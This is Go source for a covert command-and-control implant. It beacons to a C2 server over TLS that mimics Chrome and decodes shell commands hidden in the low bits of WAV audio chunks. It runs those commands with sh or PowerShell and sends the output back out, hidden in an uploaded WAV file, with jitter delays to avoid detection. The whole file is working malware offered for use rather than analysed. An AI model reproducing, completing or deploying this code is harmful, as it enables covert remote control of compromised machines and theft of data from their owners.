package main

import (
	"fmt"
	"net"
	"net/http"
	"time"
	"io"
	"log"
	"sync"
	"strings"
	"flag"
	"math/rand"
	"strconv"
	"os/exec"
	"runtime"
	"os"
	"bufio"
	"bytes"
	"mime/multipart"
	utls "github.com/refraction-networking/utls"
)

type dialResult struct {
	port   string
	status string
}

var c2_server_ip string
var c2_hostname ="c2.egress-whisperer.local"
var timeout time.Duration
var echo_to_stdout = "off"

var http_request_string_pre = "GET /api/v1/sample/chunk/"
var http_request_string_pro = " HTTP/1.1\r\n" +
           "Host: " + c2_hostname + "\r\n" +
           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n" +
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" +
           "Accept-Language: en-US,en;q=0.5\r\n" +
           "Connection: keep-alive\r\n" + //keep-alive //close
           "\r\n"

func dialUtls(port string, resultChan chan<- dialResult)(*utls.UConn, *bufio.Reader, error){

	conn, err := net.DialTimeout("tcp", c2_server_ip+":"+port, timeout)
	if err!=nil{
		log.Println(err)
		resultChan <- dialResult{port: port, status: err.Error()}
		return nil, nil, err
	}

	config := &utls.Config{InsecureSkipVerify: true}
	uConn := utls.UClient(conn, config, utls.HelloChrome_Auto)

	err = uConn.Handshake()
	if err != nil {
		log.Println("TLS Handshake Blocked or Failed:", err)
		resultChan <- dialResult{port: port, status: err.Error()}
		return nil, nil, err
	}
	reader := bufio.NewReader(uConn)
	return uConn, reader, nil
}

func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- dialResult){
	
	defer wg.Done()

	//to handle stream download
	uConn, reader, err := dialUtls(port, resultChan)
	if err!=nil{
		fmt.Println("errored out downl utls conn ", err)
	}
	defer uConn.Close()

	//to handle file upload
	uuConn, ureader, uerr := dialUtls(port, resultChan)
	if err!=nil{
		fmt.Println("errored out downl utls conn ", uerr)
	}
	defer uConn.Close()
	
	initialBurst :=20
	chunkIndex :=0
	conn_err_retry_count :=0
	for{//ideally this loop sleeps for 2 secs every operation, sends a GET req from line 70, and reads data from reader, calls decode engine

		http_request_string := http_request_string_pre + strconv.Itoa(chunkIndex) + http_request_string_pro
		fmt.Fprintf(uConn, http_request_string)
		
		dummyReq := &http.Request{Method: "GET"} //so that we can pass it to next statement
		//ideally, the dummyReq part comes from a valid request string, which we use to write to uConn
		//but this doesnt gaurentee us the order of arrival of headers, which akamai or something specfically looks for.
		//so we go hybrid mode, with fprint (instead of req = http.NewRequest, req.Write(uConn),)
		//and http.ReadResponse to read whatever was sent from the mux function in the server
		resp, err := http.ReadResponse(reader, dummyReq)
		if err!=nil {
			// io.ErrUnexpectedEOF, net.OpError (reset/timeout), etc
			fmt.Println("reading response errored out - ", err)
			conn_err_retry_count++
			if conn_err_retry_count>5{
				conn_err_retry_count =0
				resultChan <- dialResult{port: port, status: err.Error()}
				return
			}
			time.Sleep(2*time.Second)
			continue
		}
		if resp.StatusCode!= http.StatusOK{fmt.Println("iter ", chunkIndex, " code ", resp.StatusCode)}
		switch resp.StatusCode{
			case http.StatusRequestedRangeNotSatisfiable, http.StatusNotFound: //flow wont reach anyplace where response codes 40X exists, lol
				//end of file reached on server, either loop, or move to next file.
				chunkIndex = 0
				continue
			case http.StatusOK, http.StatusCreated:
				data, err:= io.ReadAll(resp.Body)
				if err!=nil{
					fmt.Println("read error 2 - ", err)
				}
				isLastChunk := resp.Header.Get("X-Last-Chunk")
				if isLastChunk == "true"{
					chunkIndex=-1
				}
	        	resp.Body.Close()

		        go decoderEngine(data, uuConn, ureader) //decoderEngine -> executeCommand -> upload/scrobble
		        
		        chunkIndex++
		        if chunkIndex>initialBurst && chunkIndex%5==0{ //could add a jitter logic
		        	time.Sleep(2 *time.Second)
		        }
		    default:
		    	fmt.Println("Unexpected status code. All the best!")
		    	return
		}
    }

	resultChan <- dialResult{port: port, status: "success for "+port}	
}

func decoderEngine(buf []byte, uConn *utls.UConn, reader *bufio.Reader){

	var current_decoded_byte byte
	cmd_bitIndex := 0
	store_command := 0
	var decoded_cmd_byte []byte
	var fifo4 []byte

	for _, stegd_byte := range(buf[:len(buf)]){
		last_bit_str := fmt.Sprintf("%08b", stegd_byte)
		last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
		//fmt.Println(last_bit_int)
		current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)

		cmd_bitIndex++
		if cmd_bitIndex==8{
			if store_command==1{
				decoded_cmd_byte = append(decoded_cmd_byte, current_decoded_byte)
			}
			fifo4 = append(fifo4, current_decoded_byte)
			if len(fifo4) > 4{
				fifo4 = fifo4[1:]
			}
			if "STRT"==string(fifo4){
				store_command = 1
			}
			if "STOP"==string(fifo4){
				store_command = 0
				finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
				decoded_cmd_byte = decoded_cmd_byte[:0]
				//fmt.Println("$>", finalCommand)
				go executeCommand(finalCommand, uConn, reader) //executeCommand -> upload/scrobble
			}
			//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
			cmd_bitIndex =0
			current_decoded_byte = 0
		}
		//fmt.Println("Recieved ", n, " bits with value", string(buf[:n]), "and bytes ", buf[:n])
	}
}
var	baseAudioTrack []byte
func main(){
	//remove this once /download or storing the file on first loop is established
	baseAudioTrack, _ = os.ReadFile("sample.wav")

	//user input collection
	target  := flag.String("target", "", "C2 server IP address (required)")
    timeout = *flag.Duration("timeout", 10*time.Second, "probe timeout per port")
    ports   := flag.String("ports", "80,8080,443,53,123", "comma separated ports to probex")
    stealth := flag.Int("stealth", 0, "Introduce random jitter between each probes. goes 0-4. Higher the number, slowe the probes")
    
    flag.Parse()

    if *target == "" {
        fmt.Println("Error: -target is required")
        flag.Usage()
        return
    }
    c2_server_ip = *target
    sl:=*stealth
    port_list := strings.Split(*ports, ",")
	for i, p := range port_list {
    	port_list[i] = strings.TrimSpace(p)
	}

	//port_list := []string{"80", "8080", "443", "53", "123", "9001", "8443"}
	port_list = []string{"443"}
	
	report := make(map[string]string)
	resultChan := make(chan dialResult, len(port_list))
	var wg sync.WaitGroup

	for _, port := range port_list{
		wg.Add(1)
		if sl >0{
			calculateAndJitter(sl)
		}
		go invokeParallelDialups(port, &wg, resultChan)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	for i := 0; i < len(port_list); i++ {
		res := <-resultChan
		report[res.port] = res.status
	}

}

func calculateAndJitter(sl int){

	var baseDelay time.Duration
	switch sl{
	case 1:
		baseDelay = 2 * time.Second
	case 2:
		baseDelay = 20 * time.Second
	case 3:
		baseDelay = 10 * time.Minute
	case 4:
		fallthrough //anything greater than 4 gets a base delay of 2 hours
	default:
		baseDelay = 2 * time.Hour
	}

	//use a variance of +/-20 %
	minMultiplier := 0.8
	maxMultiplier := 1.2

	//calculate a random multiplier within that range
	randomMultiplier := minMultiplier + rand.Float64()*(maxMultiplier-minMultiplier)
	actualSleep := time.Duration(float64(baseDelay) * randomMultiplier)
	fmt.Println("Sleeping for ", actualSleep)
	time.Sleep(actualSleep)
	return
}

func executeCommand(finalCommand string, uConn *utls.UConn, reader *bufio.Reader){
	if len(finalCommand)!=0{
		shellBinary := "sh"
		shellFlag := "-c"
		var formatted_out string
		
		if runtime.GOOS == "windows"{
			shellBinary = "powershell"
			shellFlag = "/C"
		}

		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
		res, err := cmd.Output()
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
        		formatted_out = fmt.Sprintf("%s", string(exitErr.Stderr))
    		}else{
    			formatted_out = "unknown error for " + finalCommand
    		}
		}else{
			formatted_out = strings.TrimSpace(string(res))
		}

		if len(formatted_out)<5{ //temporary threshold 5, until we figure out scrobble
			if echo_to_stdout=="on"{
			fmt.Println("sending output through scrobble")}

		}else{
			if echo_to_stdout=="on"{
			fmt.Println("Sending output through upload")}
			go encoding_engine(formatted_out, uConn, reader)
		}
		//fmt.Println("output length - ", len(formatted_out)) 
	}
}

func encoding_engine(output string, uConn *utls.UConn, reader *bufio.Reader){
	output = "STRT"+output+"STOP"
	//need logic to store base track either on first loop, or /download endpoint
	var newAudioTrack []byte
	var op_bitstring []string
	ChunkSize := 576
	op_len_threshold := ChunkSize/8
	byteOffset := 0
	totalTrackBytes := len(baseAudioTrack)
	chunk := make([]byte, ChunkSize)
	numChunksEncoded :=0
	bitstringCmdCharIndex :=0
	pendingOutput :=""

	//prepare bitstring for each char of output
	for _, char := range output{
		if echo_to_stdout=="on"{
			fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
		}
		op_bitstring = append(op_bitstring, fmt.Sprintf("%08b", char))
		//fmt.Println("Febug 5 - output bitstring state - ", op_bitstring)
	}

	for { //loop over baseAudioTrack, 1 ChunkSize at a time
		//fmt.Println("Debug info - loopCounter = ", loopCounter, " totalTrackBytes = ", totalTrackBytes," byteOffset = ", byteOffset)
		
		// Boundary Check: If we reach the end of the file, reset pointer and increment loop
		if byteOffset+ChunkSize > totalTrackBytes{
			byteOffset = 0
		}
		if (len(pendingOutput)==0 && len(output)==0){
			break
		}

		copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])

		//*********--encode message in the current chunk--******************//
		//---code for byte to bit conversion
		if len(pendingOutput)>0{
			output = pendingOutput[:min(len(pendingOutput), op_len_threshold)]+output
			pendingOutput = pendingOutput[min(len(pendingOutput), op_len_threshold):]
		}
		if len(output)>op_len_threshold{
			pendingOutput += output[op_len_threshold:]
			output = output[:op_len_threshold]
		}

		//----code to inject LSB from op_bitstring array into audio stream.
		op_bitIndex :=0
		op_charIndex :=0
		var audio_stegd_bytes []byte

		if echo_to_stdout=="on"{
			fmt.Println("Chunk length = ", len(chunk))
			fmt.Printf("Injecting payload (%d characters)...\n", len(output))
		}

		for _, aud_byte := range chunk{
			if op_charIndex == len(output) {
				if echo_to_stdout=="on"{
					fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
				}
				break
			}

			ival, _ := strconv.Atoi(string(op_bitstring[bitstringCmdCharIndex][op_bitIndex]))
			aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
			aud_byte = aud_byte | byte(ival)

			audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)

			op_bitIndex++
			if op_bitIndex==8{
				op_charIndex ++
				bitstringCmdCharIndex ++
				op_bitIndex =0
			}

		}
		copy(chunk[:op_charIndex*8], audio_stegd_bytes[:op_charIndex*8])
		numChunksEncoded++
		
		newAudioTrack = append(newAudioTrack, chunk...)

		//fmt.Println("chunk len verification - ", len(chunk))
		byteOffset = byteOffset + ChunkSize
		output = ""
	}

	if numChunksEncoded*ChunkSize > len(baseAudioTrack){
		//need logic to shove shiz into another upload track. better choose a big one
		fmt.Println("track too small for encoding the whole output")

	}else{
		newAudioTrack = append(newAudioTrack, baseAudioTrack[numChunksEncoded*ChunkSize:]...)
	}

	uploadOutputAsWav(newAudioTrack, numChunksEncoded*ChunkSize, uConn, reader)
}

func uploadOutputAsWav(newAudioTrack []byte, size int, uConn *utls.UConn, reader *bufio.Reader){

	var body bytes.Buffer
    writer := multipart.NewWriter(&body)
	part, err := writer.CreateFormFile("file", "sample.wav") //doesnt create a new file
	if err != nil {
		fmt.Println("Failed 1, ", err)
	}
	if _, err := part.Write(newAudioTrack); err != nil {
		fmt.Println("Failed 2, ", err)
	}

	if err := writer.Close(); err != nil {
		fmt.Println("Failed 3, ", err)
	}
	reqHeader := fmt.Sprintf(
		"POST /api/v1/upload HTTP/1.1\r\n"+
		"Host: "+ c2_hostname +"\r\n"+
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n" +
		"Content-Type: %s\r\n"+
		"Content-Length: %d\r\n"+
		//"Authorization: Bearer %s\r\n"+ //needed?
		"Accept: application/json\r\n"+
		"Connection: keep-alive\r\n"+
		"\r\n",
	writer.FormDataContentType(), // includes the boundary — must match what's in body
	body.Len(),
    //token??
	)

	if _, err := io.WriteString(uConn, reqHeader); err != nil {
		fmt.Errorf("write header: %w", err)
	}
	if _, err := uConn.Write(body.Bytes()); err != nil {
		fmt.Errorf("write body: %w", err)
	}

	dummyReq := &http.Request{Method: "POST"}
	http.ReadResponse(reader, dummyReq)
}